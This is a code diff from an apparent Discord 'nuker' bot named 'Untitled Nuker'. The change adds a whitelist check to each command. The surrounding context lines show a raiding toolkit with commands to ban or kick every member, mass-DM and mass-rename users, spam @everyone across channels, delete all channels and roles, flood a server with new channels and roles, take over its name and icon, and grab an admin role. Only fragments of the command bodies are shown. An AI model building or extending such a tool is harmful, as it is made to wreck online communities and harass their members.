@@ -243,6 +243,7 @@ async def help(ctx):
 
 
 @bot.group(name='settings', aliases=["config"], invoke_without_command=True)
+@commands.check(isWhitelisted)
 async def settings(ctx):
     p = bot.command_prefix
     embed = discord.Embed(
@@ -363,6 +364,7 @@ async def settingsActivity(ctx, action, activityType="playing", *, text=f"Untitl
 
 
 @bot.command(name='1', aliases=["nk", "nuke"])
+@commands.check(isWhitelisted)
 async def nuke(ctx, ban: bool = True, text: str = "Untitled Nuker"):
     await msg_delete(ctx)
 
@@ -422,6 +424,7 @@ async def nuke(ctx, ban: bool = True, text: str = "Untitled Nuker"):
 
 
 @bot.command(name='2', aliases=["be", "baneveryone"])
+@commands.check(isWhitelisted)
 async def banEveryone(ctx):
     await msg_delete(ctx)
     for m in ctx.guild.members:
@@ -436,6 +439,7 @@ async def banEveryone(ctx):
 
 
 @bot.command(name='3', aliases=["ke", "kickeveryone"])
+@commands.check(isWhitelisted)
 async def kickEveryone(ctx):
     await msg_delete(ctx)
     for m in ctx.guild.members:
@@ -450,6 +454,7 @@ async def kickEveryone(ctx):
 
 
 @bot.command(name="4", aliases=["chen"])
+@commands.check(isWhitelisted)
 async def renameEveryone(ctx, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for m in ctx.guild.members:
@@ -464,6 +469,7 @@ async def renameEveryone(ctx, *, name="Untitled Nuker"):
 
 
 @bot.command(name="5", aliases=["dme"])
+@commands.check(isWhitelisted)
 async def dmEveryone(ctx, *, msg="Untitled Nuker"):
     await msg_delete(ctx)
     for m in ctx.guild.members:
@@ -478,6 +484,7 @@ async def dmEveryone(ctx, *, msg="Untitled Nuker"):
 
 
 @bot.command(name="6", aliases=["sa"])
+@commands.check(isWhitelisted)
 async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -490,6 +497,7 @@ async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Untitled N
 
 
 @bot.command(name='7', aliases=["sc"])
+@commands.check(isWhitelisted)
 async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -501,6 +509,7 @@ async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Untitle
 
 
 @bot.command(name='8', aliases=["dch"])
+@commands.check(isWhitelisted)
 async def deleteAllChannels(ctx):
     await msg_delete(ctx)
     for ch in ctx.guild.channels:
@@ -512,6 +521,7 @@ async def deleteAllChannels(ctx):
 
 
 @bot.command(name='9', aliases=["dr"])
+@commands.check(isWhitelisted)
 async def deleteAllRoles(ctx):
     await msg_delete(ctx)
     for r in ctx.guild.roles:
@@ -523,6 +533,7 @@ async def deleteAllRoles(ctx):
 
 
 @bot.command(name="10", aliases=["sch"])
+@commands.check(isWhitelisted)
 async def spamWithChannels(ctx, amount: int = 25, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -534,6 +545,7 @@ async def spamWithChannels(ctx, amount: int = 25, *, name="Untitled Nuker"):
 
 
 @bot.command(name="11", aliases=["sr"])
+@commands.check(isWhitelisted)
 async def spamWithRoles(ctx, amount: int = 25, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     for i in range(amount):
@@ -545,6 +557,7 @@ async def spamWithRoles(ctx, amount: int = 25, *, name="Untitled Nuker"):
 
 
 @bot.command(name='12', aliases=["si"])
+@commands.check(isWhitelisted)
 async def editServerIcon(ctx):
     await msg_delete(ctx)
     if ctx.message.attachments:
@@ -560,6 +573,7 @@ async def editServerIcon(ctx):
 
 
 @bot.command(name='13', aliases=["sn"])
+@commands.check(isWhitelisted)
 async def editServerName(ctx, *, name="Untitled Nuker"):
     await msg_delete(ctx)
     try:
@@ -570,6 +584,7 @@ async def editServerName(ctx, *, name="Untitled Nuker"):
 
 
 @bot.command(name="14", aliases=["ga"])
+@commands.check(isWhitelisted)
 async def getAdmin(ctx, *, rolename="Untitled Nuker"):
     await msg_delete(ctx)
     try:
@@ -582,6 +597,7 @@ async def getAdmin(ctx, *, rolename="Untitled Nuker"):
 
 
 @bot.command(name='15', aliases=["rg"])
+@commands.check(isWhitelisted)
 @commands.dm_only()
 async def reviveGuild(ctx, guildId: int = None):
     if guildId:
